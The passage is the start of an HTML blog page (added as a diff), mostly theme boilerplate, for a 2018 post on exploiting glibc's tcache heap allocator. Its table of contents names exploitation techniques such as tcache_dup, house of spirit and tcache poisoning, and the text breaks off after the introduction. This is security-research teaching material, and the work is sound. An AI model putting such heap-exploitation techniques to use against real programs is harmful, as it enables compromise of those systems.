@@ -1,0 +1,1173 @@
+<!DOCTYPE html>
+<html style="display: none;" lang="zh">
+    <head>
+    <meta charset="utf-8">
+    <meta name="baidu-site-verification" content="RC70b8mZ9A" />
+    <meta name="msvalidate.01" content="325714A6172A8D425D843D8163893A54" />
+    <meta name="google-site-verification" content="QAmqP2zEYaSBqoZ9w1x5RdOflLW2Fir2-yVs5LTIUxA" />
+    <meta name="google-site-verification" content="QgUuEnRKG0PKdnDrOxnq55x7VxQbCiprrMJpfakMlow" />
+    <!--
+        © Material Theme
+        https://github.com/viosey/hexo-theme-material
+        Version: 1.5.0 -->
+    <script>
+        window.materialVersion = "1.5.0"
+        // Delete localstorage with these tags
+        window.oldVersion = [
+            'codestartv1',
+            '1.3.4',
+            '1.4.0',
+            '1.4.0b1'
+        ]
+    </script>
+
+
+    <!-- dns prefetch -->
+    <meta http-equiv="x-dns-prefetch-control" content="on">
+
+
+
+    <link rel="dns-prefetch" href="https://busuanzi.ibruce.info"/>
+
+
+
+        <link rel="dns-prefetch" href="https://cdn-city.livere.com"/>
+
+
+
+
+
+
+
+
+
+
+    <!-- Title -->
+    
+    <title>
+        
+            Pwn Heap With Tcache | 
+        
+        穷则变，变则通，通则久
+    </title>
+
+    <!-- Meta & Info -->
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="format-detection" content="telephone=no"/>
+    <meta name="theme-color" content="#0097A7">
+    <meta name="author" content="hac425">
+    <meta name="description" itemprop="description" content="">
+    <meta name="keywords" content=",tcache,pwn heap">
+
+    <!-- Import lsloader -->
+    <script>(function(){window.lsloader={jsRunSequence:[],jsnamemap:{},cssnamemap:{}};lsloader.removeLS=function(key){try{localStorage.removeItem(key)}catch(e){}};lsloader.setLS=function(key,val){try{localStorage.setItem(key,val)}catch(e){}};lsloader.getLS=function(key){var val="";try{val=localStorage.getItem(key)}catch(e){val=""}return val};versionString="/*"+(window.materialVersion||"unknownVersion")+"*/";lsloader.clean=function(){try{var keys=[];for(var i=0;i<localStorage.length;i++){keys.push(localStorage.key(i))}keys.forEach(function(key){var data=lsloader.getLS(key);if(window.oldVersion){var remove=window.oldVersion.reduce(function(p,c){return p||data.indexOf("/*"+c+"*/")!==-1},false);if(remove){lsloader.removeLS(key)}}})}catch(e){}};lsloader.clean();lsloader.load=function(jsname,jspath,cssonload,isJs){if(typeof cssonload==="boolean"){isJs=cssonload;cssonload=undefined}isJs=isJs||false;cssonload=cssonload||function(){};var code;code=this.getLS(jsname);if(code&&code.indexOf(versionString)===-1){this.removeLS(jsname);this.requestResource(jsname,jspath,cssonload,isJs);return}if(code){var versionNumber=code.split(versionString)[0];if(versionNumber!=jspath){console.log("reload:"+jspath);this.removeLS(jsname);this.requestResource(jsname,jspath,cssonload,isJs);return}code=code.split(versionString)[1];if(isJs){this.jsRunSequence.push({name:jsname,code:code});this.runjs(jspath,jsname,code)}else{document.getElementById(jsname).appendChild(document.createTextNode(code));cssonload()}}else{this.requestResource(jsname,jspath,cssonload,isJs)}};lsloader.requestResource=function(name,path,cssonload,isJs){var that=this;if(isJs){this.iojs(path,name,function(path,name,code){that.setLS(name,path+versionString+code);that.runjs(path,name,code)})}else{this.iocss(path,name,function(code){document.getElementById(name).appendChild(document.createTextNode(code));that.setLS(name,path+versionString+code)},cssonload)}};lsloader.iojs=function(path,jsname,callback){var that=this;that.jsRunSequence.push({name:jsname,code:""});try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(path,jsname,xhr.response);return}}that.jsfallback(path,jsname)}};xhr.send(null)}catch(e){that.jsfallback(path,jsname)}};lsloader.iocss=function(path,jsname,callback,cssonload){var that=this;try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(xhr.response);cssonload();return}}that.cssfallback(path,jsname,cssonload)}};xhr.send(null)}catch(e){that.cssfallback(path,jsname,cssonload)}};lsloader.iofonts=function(path,jsname,callback,cssonload){var that=this;try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(xhr.response);cssonload();return}}that.cssfallback(path,jsname,cssonload)}};xhr.send(null)}catch(e){that.cssfallback(path,jsname,cssonload)}};lsloader.runjs=function(path,name,code){if(!!name&&!!code){for(var k in this.jsRunSequence){if(this.jsRunSequence[k].name==name){this.jsRunSequence[k].code=code}}}if(!!this.jsRunSequence[0]&&!!this.jsRunSequence[0].code&&this.jsRunSequence[0].status!="failed"){var script=document.createElement("script");script.appendChild(document.createTextNode(this.jsRunSequence[0].code));script.type="text/javascript";document.getElementsByTagName("head")[0].appendChild(script);this.jsRunSequence.shift();if(this.jsRunSequence.length>0){this.runjs()}}else if(!!this.jsRunSequence[0]&&this.jsRunSequence[0].status=="failed"){var that=this;var script=document.createElement("script");script.src=this.jsRunSequence[0].path;script.type="text/javascript";this.jsRunSequence[0].status="loading";script.onload=function(){that.jsRunSequence.shift();if(that.jsRunSequence.length>0){that.runjs()}};document.body.appendChild(script)}};lsloader.tagLoad=function(path,name){this.jsRunSequence.push({name:name,code:"",path:path,status:"failed"});this.runjs()};lsloader.jsfallback=function(path,name){if(!!this.jsnamemap[name]){return}else{this.jsnamemap[name]=name}for(var k in this.jsRunSequence){if(this.jsRunSequence[k].name==name){this.jsRunSequence[k].code="";this.jsRunSequence[k].status="failed";this.jsRunSequence[k].path=path}}this.runjs()};lsloader.cssfallback=function(path,name,cssonload){if(!!this.cssnamemap[name]){return}else{this.cssnamemap[name]=1}var link=document.createElement("link");link.type="text/css";link.href=path;link.rel="stylesheet";link.onload=link.onerror=cssonload;var root=document.getElementsByTagName("script")[0];root.parentNode.insertBefore(link,root)};lsloader.runInlineScript=function(scriptId,codeId){var code=document.getElementById(codeId).innerText;this.jsRunSequence.push({name:scriptId,code:code});this.runjs()};lsloader.loadCombo=function(jslist){var updateList="";var requestingModules={};for(var k in jslist){var LS=this.getLS(jslist[k].name);if(!!LS){var version=LS.split(versionString)[0];var code=LS.split(versionString)[1]}else{var version=""}if(version==jslist[k].path){this.jsRunSequence.push({name:jslist[k].name,code:code,path:jslist[k].path})}else{this.jsRunSequence.push({name:jslist[k].name,code:null,path:jslist[k].path,status:"comboloading"});requestingModules[jslist[k].name]=true;updateList+=(updateList==""?"":";")+jslist[k].path}}var that=this;if(!!updateList){var xhr=new XMLHttpRequest;xhr.open("get",combo+updateList,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){that.runCombo(xhr.response,requestingModules);return}}else{for(var i in that.jsRunSequence){if(requestingModules[that.jsRunSequence[i].name]){that.jsRunSequence[i].status="failed"}}that.runjs()}}};xhr.send(null)}this.runjs()};lsloader.runCombo=function(comboCode,requestingModules){comboCode=comboCode.split("/*combojs*/");comboCode.shift();for(var k in this.jsRunSequence){if(!!requestingModules[this.jsRunSequence[k].name]&&!!comboCode[0]){this.jsRunSequence[k].status="comboJS";this.jsRunSequence[k].code=comboCode[0];this.setLS(this.jsRunSequence[k].name,this.jsRunSequence[k].path+versionString+comboCode[0]);comboCode.shift()}}this.runjs()}})();</script>
+
+    <!-- Import queue -->
+    <script>function Queue(){this.dataStore=[];this.offer=b;this.poll=d;this.execNext=a;this.debug=false;this.startDebug=c;function b(e){if(this.debug){console.log("Offered a Queued Function.")}if(typeof e==="function"){this.dataStore.push(e)}else{console.log("You must offer a function.")}}function d(){if(this.debug){console.log("Polled a Queued Function.")}return this.dataStore.shift()}function a(){var e=this.poll();if(e!==undefined){if(this.debug){console.log("Run a Queued Function.")}e()}}function c(){this.debug=true}}var queue=new Queue();</script>
+
+    <!-- Favicons -->
+    <link rel="icon shortcut" type="image/ico" href="/img/girl.png">
+    <link rel="icon" sizes="192x192" href="/img/girl.png">
+    <link rel="apple-touch-icon" href="/img/girl.png">
+
+    <!--iOS -->
+    <meta name="apple-mobile-web-app-title" content="Title">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="MobileOptimized" content="480">
+
+    <!-- Add to homescreen for Chrome on Android -->
+    <meta name="mobile-web-app-capable" content="yes">
+
+    <!-- Add to homescreen for Safari on iOS -->
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="apple-mobile-web-app-title" content="穷则变，变则通，通则久">
+
+    <!-- Site Verification -->
+    
+    
+
+    <!-- RSS -->
+    
+
+    <!--[if lte IE 9]>
+        <link rel="stylesheet" href="/css/ie-blocker.css">
+
+        
+            <script src="/js/ie-blocker.zhCN.js"></script>
+        
+    <![endif]-->
+
+    <!-- Import CSS -->
+    
+        <style id="material_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("material_css","/css/material.min.css?Z7a72R1E4SxzBKR/WGctOA==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+        <style id="style_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("style_css","/css/style.min.css?MKetZV3cUTfDxvMffaOezg==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+
+        
+
+    
+
+    
+
+    <!-- Config CSS -->
+
+<!-- Other Styles -->
+<style>
+  body, html {
+    font-family: Roboto, "Helvetica Neue", Helvetica, "PingFang SC", "Hiragino Sans GB", "Microsoft YaHei", "微软雅黑", Arial, sans-serif;
+    overflow-x: hidden !important;
+  }
+  
+  code {
+    font-family: Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace;
+  }
+
+  a {
+    color: #00838F;
+  }
+
+  .mdl-card__media,
+  #search-label,
+  #search-form-label:after,
+  #scheme-Paradox .hot_tags-count,
+  #scheme-Paradox .sidebar_archives-count,
+  #scheme-Paradox .sidebar-colored .sidebar-header,
+  #scheme-Paradox .sidebar-colored .sidebar-badge{
+    background-color: #0097A7 !important;
+  }
+
+  /* Sidebar User Drop Down Menu Text Color */
+  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:hover,
+  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:focus {
+    color: #0097A7 !important;
+  }
+
+  #post_entry-right-info,
+  .sidebar-colored .sidebar-nav li:hover > a,
+  .sidebar-colored .sidebar-nav li:hover > a i,
+  .sidebar-colored .sidebar-nav li > a:hover,
+  .sidebar-colored .sidebar-nav li > a:hover i,
+  .sidebar-colored .sidebar-nav li > a:focus i,
+  .sidebar-colored .sidebar-nav > .open > a,
+  .sidebar-colored .sidebar-nav > .open > a:hover,
+  .sidebar-colored .sidebar-nav > .open > a:focus,
+  #ds-reset #ds-ctx .ds-ctx-entry .ds-ctx-head a {
+    color: #0097A7 !important;
+  }
+
+  .toTop {
+    background: #757575 !important;
+  }
+
+  .material-layout .material-post>.material-nav,
+  .material-layout .material-index>.material-nav,
+  .material-nav a {
+    color: #757575;
+  }
+
+  #scheme-Paradox .MD-burger-layer {
+    background-color: #757575;
+  }
+
+  #scheme-Paradox #post-toc-trigger-btn {
+    color: #757575;
+  }
+
+  .post-toc a:hover {
+    color: #00838F;
+    text-decoration: underline;
+  }
+
+</style>
+
+
+<!-- Theme Background Related-->
+
+    <style>
+      body{
+        background-color: #F5F5F5;
+      }
+
+      /* blog_info bottom background */
+      #scheme-Paradox .material-layout .something-else .mdl-card__supporting-text{
+        background-color: #fff;
+      }
+    </style>
+
+
+
+
+<!-- Fade Effect -->
+
+    <style>
+      .fade {
+        transition: all 800ms linear;
+        -webkit-transform: translate3d(0,0,0);
+        -moz-transform: translate3d(0,0,0);
+        -ms-transform: translate3d(0,0,0);
+        -o-transform: translate3d(0,0,0);
+        transform: translate3d(0,0,0);
+        opacity: 1;
+      }
+
+      .fade.out{
+        opacity: 0;
+      }
+    </style>
+
+
+<!-- Import Font -->
+<!-- Import Roboto -->
+
+    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500" rel="stylesheet">
+
+
+<!-- Import Material Icon -->
+
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+
+
+
+
+    <!-- Import jQuery -->
+    
+        <script>lsloader.load("jq_js","/js/jquery.min.js?ezyEvm8ST5CGfpA+kFFi1g==", true)</script>
+    
+
+    <!-- The Open Graph protocol -->
+    <meta property="og:url" content="http://blog.hac425.top">
+    <meta property="og:type" content="blog">
+    <meta property="og:title" content="Pwn Heap With Tcache | 穷则变，变则通，通则久">
+    <meta property="og:image" content="http://blog.hac425.top/img/girl.png" />
+    <meta property="og:description" content="">
+    <meta property="og:article:tag" content="tcache"> <meta property="og:article:tag" content="pwn heap"> 
+
+    
+        <meta property="article:published_time" content="Sun Jun 03 2018 10:40:00 GMT+0800" />
+        <meta property="article:modified_time" content="Sun Jun 03 2018 10:41:18 GMT+0800" />
+    
+
+    <!-- The Twitter Card protocol -->
+    <meta name="twitter:title" content="Pwn Heap With Tcache | 穷则变，变则通，通则久">
+    <meta name="twitter:description" content="">
+    <meta name="twitter:image" content="http://blog.hac425.top/img/girl.png">
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:url" content="http://blog.hac425.top" />
+
+    <!-- Add canonical link for SEO -->
+    
+        <link rel="canonical" href="http://blog.hac425.top/2018/06/03/Pwn-Heap-With-Tcache.html" />
+    
+
+    <!-- Structured-data for SEO -->
+    
+        
+
+
+<script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "BlogPosting",
+    "mainEntityOfPage": "http://blog.hac425.top/2018/06/03/Pwn-Heap-With-Tcache.html",
+    "headline": "Pwn Heap With Tcache",
+    "datePublished": "Sun Jun 03 2018 10:40:00 GMT+0800",
+    "dateModified": "Sun Jun 03 2018 10:41:18 GMT+0800",
+    "author": {
+        "@type": "Person",
+        "name": "hac425",
+        "image": {
+            "@type": "ImageObject",
+            "url": "/img/girl.png"
+        },
+        "description": "纵横捭阖，冷心为上"
+    },
+    "publisher": {
+        "@type": "Organization",
+        "name": "穷则变，变则通，通则久",
+        "logo": {
+            "@type":"ImageObject",
+            "url": "/img/girl.png"
+        }
+    },
+    "keywords": ",tcache,pwn heap",
+    "description": "",
+}
+</script>
+
+
+    
+
+    <!-- Analytics -->
+    
+    
+        <script>
+    var _hmt = _hmt || [];
+    (function() {var hm = document.createElement('script');
+    hm.src = 'https://hm.baidu.com/hm.js?99747687c69d73d9102f032f78f03e96';
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+    
+    
+
+    <!-- Custom Head -->
+    
+
+</head>
+
+
+    
+        <body id="scheme-Paradox" class="lazy">
+            <div class="material-layout  mdl-js-layout has-drawer is-upgraded">
+                
+
+                <!-- Main Container -->
+                <main class="material-layout__content" id="main">
+
+                    <!-- Top Anchor -->
+                    <div id="top"></div>
+
+                    
+                        <!-- Hamburger Button -->
+                        <button class="MD-burger-icon sidebar-toggle">
+                            <span class="MD-burger-layer"></span>
+                        </button>
+                    
+
+                    <!-- Post TOC -->
+
+    
+    <!-- Back Button -->
+    <!--
+    <div class="material-back" id="backhome-div" tabindex="0">
+        <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon"
+           href="#" onclick="window.history.back();return false;"
+           target="_self"
+           role="button"
+           data-upgraded=",MaterialButton,MaterialRipple">
+            <i class="material-icons" role="presentation">arrow_back</i>
+            <span class="mdl-button__ripple-container">
+                <span class="mdl-ripple"></span>
+            </span>
+        </a>
+    </div>
+    -->
+
+
+    <!-- Left aligned menu below button -->
+    
+    
+    <button id="post-toc-trigger-btn"
+        class="mdl-button mdl-js-button mdl-button--icon">
+        <i class="material-icons">format_list_numbered</i>
+    </button>
+
+    <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Pwn-Heap-With-Tcache"><span class="post-toc-number">1.</span> <span class="post-toc-text">Pwn Heap With Tcache</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#前言"><span class="post-toc-number">2.</span> <span class="post-toc-text">前言</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#源码分析"><span class="post-toc-number">3.</span> <span class="post-toc-text">源码分析</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#相关数据结构"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">相关数据结构</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#基本操作"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">基本操作</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#tcache-put"><span class="post-toc-number">3.2.1.</span> <span class="post-toc-text">tcache_put</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#tcache-get"><span class="post-toc-number">3.2.2.</span> <span class="post-toc-text">tcache_get</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#tcache-in-malloc"><span class="post-toc-number">3.3.</span> <span class="post-toc-text">tcache in malloc</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#libc-malloc"><span class="post-toc-number">3.3.1.</span> <span class="post-toc-text">__libc_malloc</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#int-malloc"><span class="post-toc-number">3.3.2.</span> <span class="post-toc-text">_int_malloc</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#处理fastbin"><span class="post-toc-number">3.3.2.1.</span> <span class="post-toc-text">处理fastbin</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#处理-smallbin"><span class="post-toc-number">3.3.2.2.</span> <span class="post-toc-text">处理 smallbin</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#遍历unsorted-bin"><span class="post-toc-number">3.3.2.3.</span> <span class="post-toc-text">遍历unsorted bin</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#tcache-in-free"><span class="post-toc-number">3.4.</span> <span class="post-toc-text">tcache in free</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#总结"><span class="post-toc-number">3.5.</span> <span class="post-toc-text">总结</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#测试"><span class="post-toc-number">4.</span> <span class="post-toc-text">测试</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#搭建环境"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">搭建环境</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#编译glibc"><span class="post-toc-number">4.1.1.</span> <span class="post-toc-text">编译glibc</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#下载测试代码"><span class="post-toc-number">4.1.2.</span> <span class="post-toc-text">下载测试代码</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#tcache-dup"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">tcache_dup</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#介绍"><span class="post-toc-number">4.2.1.</span> <span class="post-toc-text">介绍</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#代码"><span class="post-toc-number">4.2.2.</span> <span class="post-toc-text">代码</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#tcache-house-of-spirit"><span class="post-toc-number">4.3.</span> <span class="post-toc-text">tcache_house_of_spirit</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#介绍-1"><span class="post-toc-number">4.3.1.</span> <span class="post-toc-text">介绍</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#代码-1"><span class="post-toc-number">4.3.2.</span> <span class="post-toc-text">代码</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#overlapping-chunks-by-caching"><span class="post-toc-number">4.4.</span> <span class="post-toc-text">overlapping_chunks_by_caching</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#介绍-2"><span class="post-toc-number">4.4.1.</span> <span class="post-toc-text">介绍</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#代码-2"><span class="post-toc-number">4.4.2.</span> <span class="post-toc-text">代码</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#tcache-poisoning"><span class="post-toc-number">4.5.</span> <span class="post-toc-text">tcache_poisoning</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#介绍-3"><span class="post-toc-number">4.5.1.</span> <span class="post-toc-text">介绍</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#代码-3"><span class="post-toc-number">4.5.2.</span> <span class="post-toc-text">代码</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#总结-1"><span class="post-toc-number">5.</span> <span class="post-toc-text">总结</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#参考"><span class="post-toc-number">6.</span> <span class="post-toc-text">参考</span></a></li></ol>
+    </ul>
+    
+
+
+
+
+<!-- Layouts -->
+
+    <!-- Post Module -->
+    <div class="material-post_container">
+
+        <div class="material-post mdl-grid">
+            <div class="mdl-card mdl-shadow--4dp mdl-cell mdl-cell--12-col">
+
+                <!-- Post Header(Thumbnail & Title) -->
+                
+    <!-- Paradox Post Header -->
+    
+        
+            <!-- Random Thumbnail -->
+            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
+            <script type="text/ls-javascript" id="post-thumbnail-script">
+    var randomNum = Math.floor(Math.random() * 19 + 1);
+
+    $('.post_thumbnail-random').attr('data-original', '/img/random/material-' + randomNum + '.png');
+    $('.post_thumbnail-random').addClass('lazy');
+</script>
+
+        
+    
+            <p class="article-headline-p">
+                Pwn Heap With Tcache
+            </p>
+        </div>
+
+
+
+
+
+                
+                    <!-- Paradox Post Info -->
+                    <div class="mdl-color-text--grey-700 mdl-card__supporting-text meta">
+
+    <!-- Author Avatar -->
+    <div id="author-avatar">
+        <img src="/img/girl.png" width="44px" height="44px" alt="Author Avatar"/>
+    </div>
+    <!-- Author Name & Date -->
+    <div>
+        <strong>hac425</strong>
+        <span>6月 03, 2018</span>
+    </div>
+
+    <div class="section-spacer"></div>
+
+    <!-- Favorite -->
+    <!--
+        <button id="article-functions-like-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon btn-like">
+            <i class="material-icons" role="presentation">favorite</i>
+            <span class="visuallyhidden">favorites</span>
+        </button>
+    -->
+
+    <!-- Qrcode -->
+    
+        <button id="article-functions-qrcode-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+    <i class="material-icons" role="presentation">devices other</i>
+    <span class="visuallyhidden">devices other</span>
+</button>
+<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-qrcode-button">
+    <li class="mdl-menu__item">在其它设备中阅读本文章</li>
+    
+        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACY0lEQVR42u3aQW7DMAwEwPz/0+0DiihL0lKFYHwqktTW+EARK75+vvp64eHh4eHh4eHhXcZ7xVf++7/3/7CgN7+prg0PDw/vJC9/fL6U9W8mz1qvHw8PD+8kb70ZTIr4+lkJL7knHh4e3p28d4vLGUmzjoeHh/dNvKTNrW4V680GDw8P72ZeL2atBq+99vpQ1oKHh4cX8ybL2v33P5zv4eHh4S15o/GmeCnVwOKxoSs8PDy8DbxeW9w74M9HB5KDsebQFR4eHt4GXjVgTV5NsvTePcsbAx4eHt5DvA+lNv68UL7jcOGBAzA8PDy8R3nVh82D3eo4QvJq8PDw8E7yksck4JyRh7bN7QoPDw9vMy8p98ly81LeO1orRMZ4eHh4m3nrsLXXQCfxQb6dVF8QHh4e3kleHqdOin5e4pOtaDSNi4eHhzfmzePdvB3PA4jqmBceHh7eGd5Thb46YpW/pi3TuHh4eHgtXu/oKxobHY9b5f+Lh4eHdwMv+aS6ncyHq/Dw8PBu4OVjUr1GvMruNdl4eHh4N/DyjWFOrR68bYlx8fDw8Ma83uF9b7gqOe7a0lLj4eHhbePNQ4ckrp2EuXh4eHjneXm5HzW7g9JfaPHx8PDwNvOqV3UgoFrcHw4j8PDw8DbwqkW5t6D8FfRiDjw8PLzzvGQzaB7ktxru5D54eHh4N/AmwUQSH/Q2pAeyFjw8PLwLeHnzXS3rkzgYDw8P707eugnuFfrqmNeHz/Hw8PAO8nplOolu53FDodXGw8PDO8KbFPF8ICD/tvdy8fDw8M7wvu/Cw8PDw8PDw8O74PoFdx0MNyT0f6AAAAAASUVORK5CYII=">
+    
+</ul>
+
+    
+
+    <!-- Tags (bookmark) -->
+    
+    <button id="article-functions-viewtags-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+        <i class="material-icons" role="presentation">bookmark</i>
+        <span class="visuallyhidden">bookmark</span>
+    </button>
+    <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
+        <li class="mdl-menu__item">
+        <a class="post_tag-link" href="/tags/pwn-heap/">pwn heap</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/tcache/">tcache</a>
+    </ul>
+    
+
+    <!-- Share -->
+    <button id="article-fuctions-share-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+    <i class="material-icons" role="presentation">share</i>
+    <span class="visuallyhidden">share</span>
+</button>
+<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-fuctions-share-button">
+    
+
+    
+        
+            <!-- Busuanzi Views -->
+            <a class="post_share-link" href="#">
+                <li class="mdl-menu__item">
+                    <span id="busuanzi_container_page_pv">
+                        <span id="busuanzi_value_page_pv"></span>&nbsp;浏览量
+                    </span>
+                </li>
+            </a>
+        
+    
+
+    <!-- Share Weibo -->
+    
+        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=Pwn Heap With Tcache&url=http://blog.hac425.top/2018/06/03/Pwn-Heap-With-Tcache.html&pic=http://blog.hac425.top/img/girl.png&searchPic=false&style=simple" target="_blank">
+            <li class="mdl-menu__item">
+                分享到微博
+            </li>
+        </a>
+    
+
+    <!-- Share Twitter -->
+    
+        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=Pwn Heap With Tcache&url=http://blog.hac425.top/2018/06/03/Pwn-Heap-With-Tcache.html&via=hac425" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Twitter
+            </li>
+        </a>
+    
+
+    <!-- Share Facebook -->
+    
+        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=http://blog.hac425.top/2018/06/03/Pwn-Heap-With-Tcache.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Facebook
+            </li>
+        </a>
+    
+
+    <!-- Share Google+ -->
+    
+        <a class="post_share-link" href="https://plus.google.com/share?url=http://blog.hac425.top/2018/06/03/Pwn-Heap-With-Tcache.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Google+
+            </li>
+        </a>
+    
+
+    <!-- Share LinkedIn -->
+    
+
+    <!-- Share QQ -->
+    
+
+    <!-- Share Telegram -->
+    
+</ul>
+
+</div>
+
+                
+
+                <!-- Post Content -->
+                <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
+    
+        <h1 id="Pwn-Heap-With-Tcache"><a href="#Pwn-Heap-With-Tcache" class="headerlink" title="Pwn Heap With Tcache"></a>Pwn Heap With Tcache</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><code>glibc 2.26</code> 开始引入了 <code>tcache</code> , 相关的 <code>commit</code> 可以看 <a href="https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc" target="_blank" rel="external">这里</a> 。加入 <code>tcache</code> 对性能有比较大的提升，不过由于   <code>tcache</code> 的存在 ，一些利用方式的限制条件就少了许多。具体往下看。</p>
+<p>相关文件位于</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://gitee.com/hac425/blog_data/tree/master/tcache_pwn</div></pre></td></tr></table></figure>
+<blockquote>
